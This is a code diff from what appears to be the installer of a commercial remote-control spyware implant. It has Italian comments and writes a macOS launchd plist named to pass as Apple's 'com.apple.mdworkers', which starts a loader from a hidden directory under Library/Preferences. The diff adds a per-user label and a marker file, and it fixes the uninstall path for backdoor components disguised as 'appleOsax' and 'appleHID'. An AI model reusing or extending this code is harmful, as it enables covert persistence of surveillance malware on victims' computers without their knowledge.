@@ -38,7 +38,7 @@ char _mdworker_content[]=	"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
 							"<plist version=\"1.0\">"
 							"<dict>"
 							"<key>Label</key>"
-							"<string>com.apple.mdworkers</string>"
+							"<string>com.apple.mdworkers.%S</string>"
 							"<key>ProgramArguments</key>"
 							"<array>"
 							"<string>%S/Library/Preferences/%S_/%S</string>"
@@ -133,7 +133,7 @@ BOOL MAC_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 
 	// hdir con un '_' indica la directory temporanea dove vengono droppati i file per l'installazione
 	swprintf_s(temp_backdoor_path, MAX_PATH, L"%s%s\\Library\\Preferences\\%s_", os_info->drive, user_info->user_home, rcs_info->hdir);
-	sprintf_s(mdworker_plist_content, sizeof(mdworker_plist_content), _mdworker_content, user_info->user_home, rcs_info->hdir, TEMPORARY_LOADER, user_info->user_name, rcs_info->hdir, rcs_info->hcore);
+	sprintf_s(mdworker_plist_content, sizeof(mdworker_plist_content), _mdworker_content, user_info->user_name, user_info->user_home, rcs_info->hdir, TEMPORARY_LOADER, user_info->user_name, rcs_info->hdir, rcs_info->hcore);
 	_snwprintf_s(plist_path, MAX_PATH, _TRUNCATE, L"%s\\com.apple.mdworkers.plist", temp_backdoor_path);
 
 	// Crea la directory temporanea
@@ -151,6 +151,13 @@ BOOL MAC_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 		CloseHandle(hfile);
 		return FALSE;
 	}
+	CloseHandle(hfile);
+
+	// Crea un marker nella directory temporanea
+	_snwprintf_s(plist_path, MAX_PATH, _TRUNCATE, L"%s\\00", temp_backdoor_path);
+	hfile = CreateFile(plist_path, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, NULL, NULL);
+	if (hfile == INVALID_HANDLE_VALUE)
+		return FALSE;
 	CloseHandle(hfile);
 
 	// Copia i file nella directory temporanea
@@ -301,7 +308,7 @@ BOOL MAC_DriverUnInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_str
 	if (installation_count == 0) {
 		swprintf_s(backdoor_path, MAX_PATH, L"%sLibrary\\ScriptingAdditions\\appleOsax", os_info->drive);
 		DeleteDirectory(backdoor_path);
-		swprintf_s(backdoor_path, MAX_PATH, L"%sLibrary\\InputManager\\appleHID", os_info->drive);
+		swprintf_s(backdoor_path, MAX_PATH, L"%sLibrary\\InputManagers\\appleHID", os_info->drive);
 		DeleteDirectory(backdoor_path);
 	}
 	return TRUE;
